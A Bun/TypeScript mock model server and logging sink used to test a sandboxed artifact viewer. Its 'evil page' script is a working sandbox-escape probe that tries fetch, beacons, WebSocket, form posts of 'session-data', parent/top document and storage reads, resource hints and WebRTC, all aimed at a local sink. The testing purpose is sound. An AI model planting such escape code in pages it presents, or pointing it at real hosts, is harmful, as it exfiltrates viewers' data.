#!/usr/bin/env bun
/**
 * Artifacts lab mock model provider for omp (OpenAI chat-completions, the API omp's
 * `openai-completions` client speaks: POST /v1/chat/completions with `stream: true`, SSE
 * `chat.completion.chunk`s, a finish chunk, a usage chunk, `data: [DONE]`), plus the lab's sink.
 *
 * Stateless, keyed on the newest user message of a request that offers tools (the agent's turn).
 * A marker there picks a script; each step is one tool call, made once the previous call's result
 * (found by its `tool_call_id`) is in the history; after the last one a final answer that quotes
 * the `present` result and ends with `PRESENT-LAB <script> done`:
 * - `PRESENT-HTML again` (again): rewrites report/index.html with another headline and Friday's
 *   numbers, presents it as "Lab report" again (version 2).
 * - `PRESENT-HTML` (html): writes report/logo.svg, then report/index.html (inline CSS, a bar chart
 *   an inline script draws into a <canvas>, a <table>, <img src="logo.svg">, an external link),
 *   then presents `{title: "Lab report", path: "report/index.html"}`.
 * - `PRESENT-MD` (md): presents inline Markdown (headings, a table, a mermaid block) as "Lab notes".
 * - `PRESENT-EVIL` (evil): writes evil/index.html, a page that tries every way out of the viewer's
 *   sandbox toward the sink (WebRTC from the page, an empty frame and a frame it makes, resource
 *   hints in its markup and added at runtime included) and lists each outcome in its own DOM, and
 *   presents it as "Evil page".
 * - anything else: a short answer.
 * Side requests (omp's session title, asked without tools or as a `<title-request>` message inside
 * the turn's context; TeleFlock's naming) get a short title, or a kebab-case slug when the system
 * prompt asks for one.
 *
 * The sink (127.0.0.1:18774, `SINK_PORT`) answers anything (WebSocket upgrades included) and logs
 * every request it gets (method, path, Origin, Referer, Sec-Fetch-Dest/Mode) to `SINK_LOG`; its TCP
 * port (18775, `SINK_TCP_PORT`) logs every connection (a preconnect sends nothing over http and a
 * TLS ClientHello over https, whose server name, `<probe>.localhost`, says which probe; a TURN
 * client its own bytes), its UDP port (18776, `SINK_UDP_PORT`) every datagram (a STUN request).
 * Each line there is something that got out of a presented page's sandbox.
 *
 * Port 127.0.0.1:18773 (`MOCK_PORT`; `models.yml` next to this file points there). Logs: `MOCK_LOG`
 * (else `$HOME/artifacts-mock.log`), `SINK_LOG` (else `$HOME/artifacts-sink.log`).
 */
import { appendFileSync } from "node:fs";
import { join } from "node:path";

const HOST = "127.0.0.1";
const PORT = Number(process.env.MOCK_PORT) || 18773;
const SINK_PORT = Number(process.env.SINK_PORT) || 18774;
const SINK_TCP_PORT = Number(process.env.SINK_TCP_PORT) || 18775;
const SINK_UDP_PORT = Number(process.env.SINK_UDP_PORT) || 18776;
const MODEL = "lab-1";
const LOG = process.env.MOCK_LOG || join(process.env.HOME || "/tmp", "artifacts-mock.log");
const SINK_LOG = process.env.SINK_LOG || join(process.env.HOME || "/tmp", "artifacts-sink.log");
const SINK = `http://${HOST}:${SINK_PORT}`;
const encoder = new TextEncoder();
let seq = 0;
let toolsLogged = false;

type Json = Record<string, any>;

function log(file: string, line: string) {
	appendFileSync(file, `${new Date().toISOString()} ${line}\n`);
}

function textOf(content: unknown): string {
	if (typeof content === "string") return content;
	if (Array.isArray(content)) return content.map(p => (typeof p === "string" ? p : typeof p?.text === "string" ? p.text : "")).join("");
	return "";
}

// ─── documents ──────────────────────────────────────────────────────────────────────────────────

const LOGO_SVG = `<svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="0 0 64 64">
  <rect width="64" height="64" rx="14" fill="#3f7cff"/>
  <path d="M12 44 L25 26 L33 36 L42 22 L52 44 Z" fill="#ffffff" opacity="0.92"/>
  <circle cx="21" cy="19" r="5" fill="#ffd166"/>
</svg>
`;

interface Day {
	day: string;
	passed: number;
	failed: number;
	median: number;
}

const WEEK: Day[] = [
	{ day: "Mon", passed: 42, failed: 3, median: 6.1 },
	{ day: "Tue", passed: 51, failed: 5, median: 6.4 },
	{ day: "Wed", passed: 47, failed: 2, median: 5.9 },
	{ day: "Thu", passed: 55, failed: 7, median: 6.8 },
	{ day: "Fri", passed: 38, failed: 9, median: 7.2 },
	{ day: "Sat", passed: 12, failed: 1, median: 5.1 },
	{ day: "Sun", passed: 9, failed: 0, median: 4.8 },
];

/** Revision 2: Friday's flaky runs re-run. */
const WEEK_RERUN: Day[] = WEEK.map(d => (d.day === "Fri" ? { ...d, passed: 44, failed: 3, median: 6.0 } : d));

const HEADLINES = { 1: "Weekly build report", 2: "Weekly build report: Friday's failures fixed" } as const;

function reportPage(rev: 1 | 2): string {
	const data = rev === 1 ? WEEK : WEEK_RERUN;
	const builds = data.reduce((n, d) => n + d.passed + d.failed, 0);
	const passed = data.reduce((n, d) => n + d.passed, 0);
	const failed = builds - passed;
	const rate = ((passed / builds) * 100).toFixed(1);
	const median = [...data.map(d => d.median)].sort((a, b) => a - b)[3]!.toFixed(1);
	const sub = rev === 1 ? "Week 44 · all branches · revision 1" : "Week 44 · all branches · revision 2, after Friday's re-run";
	const rows = data
		.map(d => `      <tr><td>${d.day}</td><td class="n">${d.passed + d.failed}</td><td class="n">${d.passed}</td><td class="n">${d.failed}</td><td class="n">${d.median.toFixed(1)}</td></tr>`)
		.join("\n");
	return `<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>${HEADLINES[rev]}</title>
<style>
  :root { --bg: #f6f7fb; --card: #ffffff; --ink: #1c2333; --muted: #5d6679; --line: #e2e6ef; --pass: #3f7cff; --fail: #e5484d; }
  @media (prefers-color-scheme: dark) { :root { --bg: #11151c; --card: #1a202b; --ink: #e8ecf3; --muted: #9aa4b5; --line: #2a3242; } }
  * { box-sizing: border-box; }
  body { margin: 0; padding: 28px; background: var(--bg); color: var(--ink); font: 15px/1.5 system-ui, -apple-system, "Segoe UI", sans-serif; }
  header { display: flex; align-items: center; gap: 14px; margin-bottom: 20px; }
  header img { width: 52px; height: 52px; }
  h1 { margin: 0; font-size: 26px; letter-spacing: -0.01em; }
  h2 { font-size: 16px; margin: 28px 0 10px; }
  .sub { margin: 2px 0 0; color: var(--muted); }
  .cards { display: grid; grid-template-columns: repeat(auto-fit, minmax(130px, 1fr)); gap: 12px; }
  .card { background: var(--card); border: 1px solid var(--line); border-radius: 12px; padding: 12px 14px; }
  .card span { color: var(--muted); font-size: 13px; }
  .card b { display: block; font-size: 24px; font-variant-numeric: tabular-nums; }
  .chart { background: var(--card); border: 1px solid var(--line); border-radius: 12px; padding: 12px; }
  canvas { display: block; width: 100%; height: 260px; }
  .legend { display: flex; gap: 16px; color: var(--muted); font-size: 13px; margin-top: 6px; }
  .legend i { display: inline-block; width: 10px; height: 10px; border-radius: 2px; margin-right: 6px; vertical-align: -1px; }
  table { width: 100%; border-collapse: collapse; background: var(--card); border: 1px solid var(--line); border-radius: 12px; overflow: hidden; }
  th, td { padding: 8px 12px; border-bottom: 1px solid var(--line); text-align: left; }
  th { font-size: 13px; color: var(--muted); font-weight: 600; }
  .n { text-align: right; font-variant-numeric: tabular-nums; }
  tr:last-child td { border-bottom: 0; }
  footer { margin-top: 24px; color: var(--muted); font-size: 13px; }
  a { color: var(--pass); }
</style>
</head>
<body>
<header>
  <img src="logo.svg" alt="Flock CI logo">
  <div><h1>${HEADLINES[rev]}</h1><p class="sub">${sub}</p></div>
</header>
<section class="cards">
  <div class="card"><span>Builds</span><b>${builds}</b></div>
  <div class="card"><span>Passed</span><b>${passed}</b></div>
  <div class="card"><span>Failed</span><b>${failed}</b></div>
  <div class="card"><span>Pass rate</span><b>${rate} %</b></div>
  <div class="card"><span>Median time</span><b>${median} min</b></div>
</section>
<h2>Builds per day</h2>
<div class="chart">
  <canvas id="chart" aria-label="Builds per day, passed and failed"></canvas>
  <div class="legend"><span><i style="background: var(--pass)"></i>Passed</span><span><i style="background: var(--fail)"></i>Failed</span></div>
</div>
<h2>Runs</h2>
<table>
  <thead><tr><th>Day</th><th class="n">Builds</th><th class="n">Passed</th><th class="n">Failed</th><th class="n">Median (min)</th></tr></thead>
  <tbody>
${rows}
  </tbody>
</table>
<footer>Raw numbers: <a href="https://example.com/ci/week-44" target="_blank" rel="noopener">CI dashboard (example.com)</a> · <span id="drawn">chart not drawn: the page's script did not run</span></footer>
<script>
(function () {
  var DATA = ${JSON.stringify(data.map(d => ({ day: d.day, passed: d.passed, failed: d.failed })))};
  var canvas = document.getElementById("chart");
  var css = getComputedStyle(document.documentElement);
  var pass = css.getPropertyValue("--pass").trim();
  var fail = css.getPropertyValue("--fail").trim();
  var muted = css.getPropertyValue("--muted").trim();
  var line = css.getPropertyValue("--line").trim();
  function draw() {
    var dpr = window.devicePixelRatio || 1;
    var w = canvas.clientWidth, h = canvas.clientHeight;
    canvas.width = Math.round(w * dpr);
    canvas.height = Math.round(h * dpr);
    var g = canvas.getContext("2d");
    g.setTransform(dpr, 0, 0, dpr, 0, 0);
    g.clearRect(0, 0, w, h);
    var max = 0;
    DATA.forEach(function (d) { max = Math.max(max, d.passed + d.failed); });
    max = Math.ceil(max / 20) * 20;
    var left = 34, bottom = 24, top = 8, plotH = h - bottom - top;
    var slot = (w - left) / DATA.length, bar = Math.min(44, slot * 0.6);
    g.font = "12px system-ui, sans-serif";
    g.lineWidth = 1;
    for (var t = 0; t <= max; t += max / 4) {
      var y = Math.round(top + plotH - (t / max) * plotH) + 0.5;
      g.strokeStyle = line;
      g.beginPath(); g.moveTo(left, y); g.lineTo(w, y); g.stroke();
      g.fillStyle = muted; g.textAlign = "right";
      g.fillText(String(t), left - 6, y + 4);
    }
    DATA.forEach(function (d, i) {
      var x = left + slot * i + (slot - bar) / 2;
      var hp = (d.passed / max) * plotH, hf = (d.failed / max) * plotH;
      g.fillStyle = pass; g.fillRect(x, top + plotH - hp, bar, hp);
      g.fillStyle = fail; g.fillRect(x, top + plotH - hp - hf, bar, hf);
      g.fillStyle = muted; g.textAlign = "center";
      g.fillText(d.day, x + bar / 2, h - 6);
    });
  }
  draw();
  addEventListener("resize", draw);
  document.getElementById("drawn").textContent = "chart drawn by the page's own script (" + DATA.length + " days)";
})();
</script>
</body>
</html>
`;
}

const FENCE = "```";

const NOTES_MD = [
	"# Lab notes",
	"",
	"Notes from the artifacts lab: what the agent presented and how TeleFlock should show it.",
	"",
	"## What was presented",
	"",
	"| Artifact | Kind | Versions | Files beside it |",
	"|---|---|---:|---|",
	"| Lab report | html | 2 | logo.svg |",
	"| Lab notes | markdown | 1 | none |",
	"| Evil page | html | 1 | none |",
	"",
	"## How a present flows",
	"",
	`${FENCE}mermaid`,
	"sequenceDiagram",
	"    participant A as Agent",
	"    participant B as Bridge",
	"    participant H as tf-hostd",
	"    participant U as TeleFlock",
	"    A->>B: present(title, path)",
	"    B->>B: snapshot presented/slug-vN.ext",
	"    B-->>A: Presented, version N",
	"    H->>U: tool row with its artifact",
	"    U->>H: session.artifact",
	"    H-->>U: the snapshot",
	FENCE,
	"",
	"### Checklist",
	"",
	"- [x] The report page draws its chart with its own script",
	"- [x] Presenting the same title again adds version 2",
	"- [ ] The evil page reaches nothing outside its sandbox",
	"",
	"> Every request the lab's sink logs is a sandbox failure.",
	"",
	"Inline `code`, **bold**, *italic* and a [link](https://example.com/lab-notes).",
	"",
].join("\n");

/** A page that tries every way out of the viewer's sandbox toward the sink and lists each outcome. */
const EVIL_PAGE = `<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Evil page</title>
<link rel="preconnect" href="https://static-preconnect.localhost:${SINK_TCP_PORT}/">
<link rel="dns-prefetch" href="//static-dns-prefetch.invalid">
<link rel="prerender" href="${SINK}/static-prerender">
<link rel="prefetch" href="${SINK}/static-prefetch">
<style>
  body { margin: 0; padding: 20px; background: #fff7f5; color: #2a1a17; font: 14px/1.45 system-ui, -apple-system, "Segoe UI", sans-serif; }
  h1 { margin: 0 0 4px; font-size: 22px; }
  p { margin: 0 0 12px; color: #6b4b45; }
  code { font: 12px ui-monospace, SFMono-Regular, Menlo, monospace; }
  ol { padding-left: 24px; }
  li { margin: 4px 0; }
  li.blocked { color: #116329; }
  li.escaped { color: #b42318; font-weight: 700; }
  li.info { color: #57606a; }
</style>
<script>
  var SINK = "${SINK}";
  function note(what, outcome, detail) {
    var li = document.createElement("li");
    li.className = outcome;
    li.textContent = what + ": " + outcome + (detail ? " (" + detail + ")" : "");
    (document.getElementById("log") || document.documentElement).appendChild(li);
  }
  function err(e) { return e && e.name ? e.name + ": " + e.message : String(e); }
  document.addEventListener("securitypolicyviolation", function (e) {
    note("CSP report", "info", (e.effectiveDirective || e.violatedDirective) + " refused " + (e.blockedURI || "inline"));
  });
</script>
</head>
<body>
<h1>Evil page</h1>
<p>This page tries to get out of its sandbox. Every attempt aims at the lab's sink, <code>${SINK}</code>; each request the sink logs is a sandbox failure. What the page saw:</p>
<ol id="log"></ol>
<img src="${SINK}/tag" alt="" width="1" height="1" onload="note('img tag', 'escaped', 'loaded ' + this.src)" onerror="note('img tag', 'blocked', 'error event')">
<iframe name="formsink" title="form target" hidden></iframe>
<form id="form" method="post" action="${SINK}/form" target="formsink"><input type="hidden" name="stolen" value="session-data"></form>
<script>
  note("page", "info", "scripts run; origin " + String(self.origin));
  try {
    fetch(SINK + "/fetch").then(function (r) { note("fetch", "escaped", "status " + r.status); }, function (e) { note("fetch", "blocked", err(e)); });
  } catch (e) { note("fetch", "blocked", err(e)); }
  try {
    var im = new Image();
    im.onload = function () { note("new Image()", "escaped", "loaded"); };
    im.onerror = function () { note("new Image()", "blocked", "error event"); };
    im.src = SINK + "/img";
  } catch (e) { note("new Image()", "blocked", err(e)); }
  try {
    var ws = new WebSocket("ws://${HOST}:${SINK_PORT}/ws");
    ws.onopen = function () { note("WebSocket", "escaped", "open"); };
    ws.onerror = function () { note("WebSocket", "blocked", "error event"); };
  } catch (e) { note("WebSocket", "blocked", err(e)); }
  try {
    var queued = navigator.sendBeacon(SINK + "/beacon", "stolen=session-data");
    note("sendBeacon", queued ? "info" : "blocked", queued ? "queued: blocked only if the sink logs no /beacon" : "refused");
  } catch (e) { note("sendBeacon", "blocked", err(e)); }
  try { note("parent.document.title", "escaped", JSON.stringify(parent.document.title)); } catch (e) { note("parent.document.title", "blocked", err(e)); }
  try { note("top.document.title", "escaped", JSON.stringify(top.document.title)); } catch (e) { note("top.document.title", "blocked", err(e)); }
  try { note("localStorage.getItem", "escaped", "returned " + JSON.stringify(localStorage.getItem("teleflock"))); } catch (e) { note("localStorage.getItem", "blocked", err(e)); }
  try {
    var popup = window.open(SINK + "/popup");
    note("window.open", popup ? "escaped" : "blocked", popup ? "returned a window" : "returned null");
  } catch (e) { note("window.open", "blocked", err(e)); }
  try {
    document.getElementById("form").submit();
    note("form submit", "info", "submit() returned: blocked only if the sink logs no /form");
  } catch (e) { note("form submit", "blocked", err(e)); }
  // Resource hints (CSP stops none of them): the viewer drops those in the markup (the four in
  // this page's head) and keeps scripts from adding them through the DOM; markup a script parses
  // from a string still gets through. Each preconnect names itself in its TLS server name.
  note("resource hints in this page's markup", "info", "preconnect, dns-prefetch, prerender, prefetch: blocked only if the sink logs no static-*");
  function hint(how, add) {
    try {
      var l = add();
      var rel = l ? l.getAttribute("rel") : null;
      note("resource hint by " + how, rel === "" ? "blocked" : "info", rel === null ? "added: blocked only if the sink logs no html-string" : "rel is now " + JSON.stringify(rel));
    } catch (e) { note("resource hint by " + how, "blocked", err(e)); }
  }
  function link(set, href) { var l = document.createElement("link"); set(l); l.href = href; document.head.appendChild(l); return l; }
  var TLS = function (probe) { return "https://" + probe + ".localhost:${SINK_TCP_PORT}/"; };
  hint("rel", function () { return link(function (l) { l.rel = "preconnect"; }, TLS("dom-rel")); });
  hint("setAttribute", function () { return link(function (l) { l.setAttribute("rel", "preconnect"); }, TLS("dom-setattribute")); });
  hint("relList", function () { return link(function (l) { l.relList.add("preconnect"); }, TLS("dom-rellist")); });
  hint("rel prerender", function () { return link(function (l) { l.rel = "prerender"; }, SINK + "/dom-prerender"); });
  hint("an HTML string", function () { document.head.insertAdjacentHTML("beforeend", '<link rel="preconnect" href="' + TLS("html-string") + '">'); return null; });
  // WebRTC (CSP does not cover it): STUN to the sink's UDP port, TURN over TCP to its TCP port.
  var ICE = { iceServers: [{ urls: "stun:${HOST}:${SINK_UDP_PORT}" }, { urls: "turn:${HOST}:${SINK_TCP_PORT}?transport=tcp", username: "lab", credential: "lab" }] };
  function rtc(what, Pc) {
    if (typeof Pc !== "function") { note(what, "blocked", "no RTCPeerConnection"); return; }
    try {
      var pc = new Pc(ICE);
      pc.createDataChannel("x");
      pc.createOffer().then(function (o) { return pc.setLocalDescription(o); });
      note(what, "escaped", "a peer connection gathers candidates: the sink logs UDP or TCP");
    } catch (e) { note(what, "blocked", err(e)); }
  }
  rtc("WebRTC", window.RTCPeerConnection);
  var empty = document.createElement("iframe");
  empty.hidden = true;
  document.body.appendChild(empty);
  try { rtc("WebRTC from an empty frame", empty.contentWindow.RTCPeerConnection); } catch (e) { note("WebRTC from an empty frame", "blocked", err(e)); }
  addEventListener("message", function (e) { if (e.data && e.data.evil) note(e.data.evil[0], e.data.evil[1], e.data.evil[2]); });
  var made = document.createElement("iframe");
  made.hidden = true;
  made.srcdoc = "<scr" + "ipt>var ICE = " + JSON.stringify(ICE) + "; (" + function () {
    var say = function (outcome, detail) { parent.postMessage({ evil: ["WebRTC from a frame the page made", outcome, detail] }, "*"); };
    if (typeof RTCPeerConnection !== "function") return say("blocked", "no RTCPeerConnection");
    try {
      var pc = new RTCPeerConnection(ICE);
      pc.createDataChannel("x");
      pc.createOffer().then(function (o) { return pc.setLocalDescription(o); });
      say("escaped", "a peer connection gathers candidates: the sink logs UDP or TCP");
    } catch (e) { say("blocked", String(e)); }
  } + ")();</scr" + "ipt>";
  document.body.appendChild(made);
  setTimeout(function () {
    try {
      top.location = SINK + "/top";
      note("top.location", "info", "assigned without an error: blocked only if the sink logs no /top");
    } catch (e) { note("top.location", "blocked", err(e)); }
  }, 1500);
  setTimeout(function () {
    note("location.href", "info", "navigating this page to /self: still here at 3.5 s means blocked");
    try { location.href = SINK + "/self"; } catch (e) { note("location.href", "blocked", err(e)); }
  }, 2500);
  setTimeout(function () { note("location.href", "blocked", "still here at 3.5 s"); }, 3500);
</script>
</body>
</html>
`;

// ─── scripts ────────────────────────────────────────────────────────────────────────────────────

interface Step {
	tool: string;
	/** omp's intent field (`i`), sent when the tool's schema has one. */
	intent: string;
	/** What the assistant says before the call. */
	say: string;
	args: Json;
}

interface Script {
	key: string;
	test: (prompt: string) => boolean;
	steps: Step[];
	/** The final answer's opening; the present results and `PRESENT-LAB <key> done` follow. */
	done: string;
}

const SCRIPTS: Script[] = [
	{
		key: "again",
		test: p => /PRESENT-HTML again/i.test(p),
		steps: [
			{ tool: "write", intent: "Rewriting the report page", say: "Friday's flaky runs were re-run: updating the headline and Friday's numbers.", args: { path: "report/index.html", content: reportPage(2) } },
			{ tool: "present", intent: "Presenting the revised report", say: "Presenting the revision under the same title.", args: { title: "Lab report", path: "report/index.html" } },
		],
		done: "I revised the report after Friday's re-run: new headline, Friday's bar and the totals changed. It is presented again under the same title, as a new version.",
	},
	{
		key: "html",
		test: p => p.includes("PRESENT-HTML"),
		steps: [
			{ tool: "write", intent: "Writing the report logo", say: "I'll build the report as one page. First the logo it shows.", args: { path: "report/logo.svg", content: LOGO_SVG } },
			{ tool: "write", intent: "Writing the report page", say: "Now the page: summary cards, a bar chart its inline script draws, and the run table.", args: { path: "report/index.html", content: reportPage(1) } },
			{ tool: "present", intent: "Presenting the report", say: "Presenting it.", args: { title: "Lab report", path: "report/index.html" } },
		],
		done: "The weekly build report is ready, presented as **Lab report**: summary cards, a bar chart of builds per day drawn by the page's own script, the run table and the logo.",
	},
	{
		key: "md",
		test: p => p.includes("PRESENT-MD"),
		steps: [{ tool: "present", intent: "Presenting the lab notes", say: "Here are the notes as Markdown.", args: { title: "Lab notes", content: NOTES_MD } }],
		done: "I wrote up the lab notes and presented them as **Lab notes**: a table of what was presented, a sequence diagram and a checklist.",
	},
	{
		key: "evil",
		test: p => p.includes("PRESENT-EVIL"),
		steps: [
			{ tool: "write", intent: "Writing the evil page", say: "Writing a page that tries to get out of its sandbox.", args: { path: "evil/index.html", content: EVIL_PAGE } },
			{ tool: "present", intent: "Presenting the evil page", say: "Presenting it.", args: { title: "Evil page", path: "evil/index.html" } },
		],
		done: `Presented **Evil page**: it tries every way out of its sandbox (fetch, images, a WebSocket, a beacon, the parent's and top document, storage, a popup, a form, top and self navigation, resource hints in its markup and added at runtime, WebRTC from the page, an empty frame and a frame it makes) and lists what happened. Everything the sink at ${SINK} (TCP ${SINK_TCP_PORT}, UDP ${SINK_UDP_PORT}) logs is a sandbox failure.`,
	},
];

// ─── decisions ──────────────────────────────────────────────────────────────────────────────────

interface Decision {
	kind: string;
	text?: string;
	call?: { id: string; name: string; args: Json };
}

function decide(body: Json): Decision {
	const messages: Json[] = Array.isArray(body.messages) ? body.messages : [];
	const tools: Json[] = Array.isArray(body.tools) ? body.tools : [];
	const names: string[] = tools.map(t => t?.function?.name).filter(Boolean);
	const system = messages.filter(m => m.role === "system" || m.role === "developer").map(m => textOf(m.content)).join("\n");
	let u = messages.length - 1;
	while (u >= 0 && messages[u]?.role !== "user") u--;
	const prompt = u >= 0 ? textOf(messages[u].content) : "";
	// omp's session title, asked without tools or, inside the turn's own context (with its tools),
	// as a `<title-request>` user message.
	if (!names.length || prompt.includes("<title-request>")) {
		if (/kebab-case/i.test(system)) {
			// The task's first long words (TeleFlock's naming asks between <task> tags).
			const slug = prompt.replace(/<\/?task>/g, " ").toLowerCase().replace(/[^a-z0-9\s]/g, " ").split(/\s+/).filter(w => w.length > 2).slice(0, 3).join("-");
			return { kind: "name", text: slug || "lab-report" };
		}
		return { kind: "title", text: "Weekly build report" };
	}
	const script = SCRIPTS.find(s => s.test(prompt));
	if (!script) {
		const question = prompt.replace(/\s+/g, " ").trim().slice(0, 120);
		return { kind: "answer", text: `PRESENT-LAB answer: you asked "${question}". Send PRESENT-HTML, PRESENT-HTML again, PRESENT-MD or PRESENT-EVIL to have something presented.` };
	}
	// The calls made since the prompt, in order; each result is found by its tool_call_id.
	const after = messages.slice(u + 1);
	const calls: Json[] = after.flatMap(m => (m.role === "assistant" && Array.isArray(m.tool_calls) ? m.tool_calls : []));
	const results = calls.map(c => textOf(after.find(m => m.role === "tool" && m.tool_call_id === c?.id)?.content).trim());
	calls.forEach((c, k) => log(LOG, `  result ${c?.function?.name} ${c?.id}: ${JSON.stringify(results[k]!.slice(0, 200))}`));
	if (calls.length < script.steps.length) {
		const i = calls.length;
		const step = script.steps[i]!;
		if (!names.includes(step.tool)) {
			return { kind: `${script.key}:no-${step.tool}`, text: `PRESENT-LAB ${script.key} failed: omp offers no \`${step.tool}\` tool (offered: ${names.join(", ")}).` };
		}
		const schema = tools.find(t => t?.function?.name === step.tool)?.function?.parameters;
		const args = schema?.properties?.i ? { i: step.intent, ...step.args } : step.args;
		return { kind: `${script.key}:${i + 1}/${script.steps.length}`, text: step.say, call: { id: `call_${script.key}_${i + 1}_${Date.now().toString(36)}`, name: step.tool, args } };
	}
	const presented = results.filter((_, k) => calls[k]?.function?.name === "present").map(r => r.split("\n").map(l => `> ${l}`).join("\n"));
	return { kind: `${script.key}:done`, text: [script.done, ...presented, `PRESENT-LAB ${script.key} done`].join("\n\n") };
}

// ─── wire ───────────────────────────────────────────────────────────────────────────────────────

function chunk(id: string, created: number, delta: Json | null, finish: string | null = null, usage?: Json): string {
	const body: Json = { id, object: "chat.completion.chunk", created, model: MODEL, choices: delta === null ? [] : [{ index: 0, delta, finish_reason: finish }] };
	if (usage) body.usage = usage;
	return `data: ${JSON.stringify(body)}\n\n`;
}

function stream(d: Decision, n: number): Response {
	const id = `chatcmpl-art-${n}`;
	const created = Math.floor(Date.now() / 1000);
	const body = new ReadableStream<Uint8Array>({
		async start(controller) {
			const send = (s: string) => controller.enqueue(encoder.encode(s));
			await Bun.sleep(150);
			send(chunk(id, created, { role: "assistant", content: "" }));
			// A few deltas, so the app sees the reply stream.
			for (const part of d.text?.match(/[\s\S]{1,40}/g) ?? []) {
				send(chunk(id, created, { content: part }));
				await Bun.sleep(40);
			}
			if (d.call) {
				send(chunk(id, created, { tool_calls: [{ index: 0, id: d.call.id, type: "function", function: { name: d.call.name, arguments: "" } }] }));
				// The arguments arrive in pieces, as a model writes a long file.
				const json = JSON.stringify(d.call.args);
				const pieces = 8;
				for (let k = 0; k < pieces; k++) {
					const part = json.slice(Math.floor((k * json.length) / pieces), Math.floor(((k + 1) * json.length) / pieces));
					send(chunk(id, created, { tool_calls: [{ index: 0, function: { arguments: part } }] }));
					await Bun.sleep(30);
				}
			}
			send(chunk(id, created, {}, d.call ? "tool_calls" : "stop"));
			send(chunk(id, created, null, null, { prompt_tokens: 100, completion_tokens: 20, total_tokens: 120 }));
			send("data: [DONE]\n\n");
			controller.close();
		},
	});
	return new Response(body, { headers: { "content-type": "text/event-stream; charset=utf-8", "cache-control": "no-cache" } });
}

const server = Bun.serve({
	hostname: HOST,
	port: PORT,
	idleTimeout: 255,
	async fetch(req) {
		const url = new URL(req.url);
		const path = url.pathname.replace(/\/+$/, "");
		if (req.method === "POST" && (path === "/v1/chat/completions" || path === "/chat/completions")) {
			const n = ++seq;
			const body = (await req.json()) as Json;
			if (!toolsLogged && Array.isArray(body.tools) && body.tools.length) {
				toolsLogged = true;
				log(LOG, `tools offered: ${body.tools.map((t: Json) => `${t?.function?.name}${t?.function?.parameters?.properties?.i ? "(i)" : ""}`).join(", ")}`);
			}
			const d = decide(body);
			log(LOG, `#${n} ${d.kind} msgs=${body.messages?.length ?? 0} tools=${body.tools?.length ?? 0} stream=${body.stream === true}${d.call ? ` call=${d.call.name} ${d.call.id}` : ""}${d.text ? ` text=${JSON.stringify(d.text.slice(0, 120))}` : ""}`);
			if (body.stream === true) return stream(d, n);
			const message: Json = { role: "assistant", content: d.text ?? null };
			if (d.call) message.tool_calls = [{ id: d.call.id, type: "function", function: { name: d.call.name, arguments: JSON.stringify(d.call.args) } }];
			return Response.json({ id: `chatcmpl-art-${n}`, object: "chat.completion", created: Math.floor(Date.now() / 1000), model: MODEL, choices: [{ index: 0, message, finish_reason: d.call ? "tool_calls" : "stop" }], usage: { prompt_tokens: 100, completion_tokens: 20, total_tokens: 120 } });
		}
		if (req.method === "GET" && (path === "/v1/models" || path === "/models")) return Response.json({ object: "list", data: [{ id: MODEL, object: "model", created: 0, owned_by: "tf-lab-artifacts" }] });
		if (req.method === "GET" && (path === "" || path === "/health")) return new Response("ok\n");
		return Response.json({ error: { message: `no route ${req.method} ${url.pathname}` } }, { status: 404 });
	},
});

// ─── sink ───────────────────────────────────────────────────────────────────────────────────────

const GIF = Uint8Array.from(atob("R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw=="), c => c.charCodeAt(0));
appendFileSync(SINK_LOG, "");
const sink = Bun.serve({
	hostname: HOST,
	port: SINK_PORT,
	fetch(req, srv) {
		const url = new URL(req.url);
		const h = (k: string) => req.headers.get(k) ?? "-";
		log(SINK_LOG, `${req.method} ${url.pathname}${url.search} origin=${h("origin")} referer=${h("referer")} dest=${h("sec-fetch-dest")} mode=${h("sec-fetch-mode")}`);
		const headers = { "access-control-allow-origin": "*", "access-control-allow-headers": "*", "access-control-allow-methods": "*", "cache-control": "no-store" };
		if (req.headers.get("upgrade")?.toLowerCase() === "websocket" && srv.upgrade(req)) return undefined;
		if (req.method === "OPTIONS") return new Response(null, { status: 204, headers });
		if (url.pathname === "/img" || url.pathname === "/tag") return new Response(GIF, { headers: { ...headers, "content-type": "image/gif" } });
		if (url.pathname === "/fetch" || url.pathname === "/beacon") return new Response(`${url.pathname} reached the sink: a sandbox failure\n`, { headers: { ...headers, "content-type": "text/plain" } });
		return new Response(
			`<!doctype html><meta charset="utf-8"><title>Sandbox escape</title><body style="font:16px system-ui;background:#b42318;color:#fff;padding:24px"><h1>Sandbox escape</h1><p>${url.pathname} reached the lab's sink at ${SINK}. A presented page must never get here.</p></body>`,
			{ headers: { ...headers, "content-type": "text/html; charset=utf-8" } },
		);
	},
	websocket: {
		open(ws) {
			ws.send("a WebSocket reached the sink: a sandbox failure");
			ws.close();
		},
		message() {},
	},
});

// Raw TCP: a preconnect (nothing over http, a TLS ClientHello naming `<probe>.localhost` over https)
// or a TURN client. One line per connection, with what its first bytes say.
const tcpSink = Bun.listen<{ seen: boolean }>({
	hostname: HOST,
	port: SINK_TCP_PORT,
	socket: {
		open(s) {
			s.data = { seen: false };
			log(SINK_LOG, `TCP ${SINK_TCP_PORT} connection from ${s.remoteAddress}`);
		},
		data(s, bytes) {
			if (s.data.seen) return;
			s.data.seen = true;
			const text = new TextDecoder("latin1").decode(bytes);
			const name = /[a-z0-9-]+\.localhost/.exec(text)?.[0];
			log(SINK_LOG, `TCP ${SINK_TCP_PORT} ${bytes[0] === 0x16 ? `TLS ClientHello${name ? ` for ${name}` : ""}` : `${bytes.length} bytes (not TLS: a TURN client?)`}`);
		},
	},
});
// UDP: a STUN request from a peer connection gathering candidates.
const udpSink = await Bun.udpSocket({
	hostname: HOST,
	port: SINK_UDP_PORT,
	socket: {
		data(_socket, buf, port, address) {
			log(SINK_LOG, `UDP ${SINK_UDP_PORT} ${buf.length} bytes from ${address}:${port} (a STUN request)`);
		},
	},
});

log(LOG, `start pid=${process.pid} port=${server.port} sink=${sink.port} tcp=${tcpSink.port} udp=${udpSink.port}`);
console.log(`artifacts mock on http://${HOST}:${server.port}, sink on http://${HOST}:${sink.port}, TCP ${tcpSink.port}, UDP ${udpSink.port} (pid ${process.pid})`);
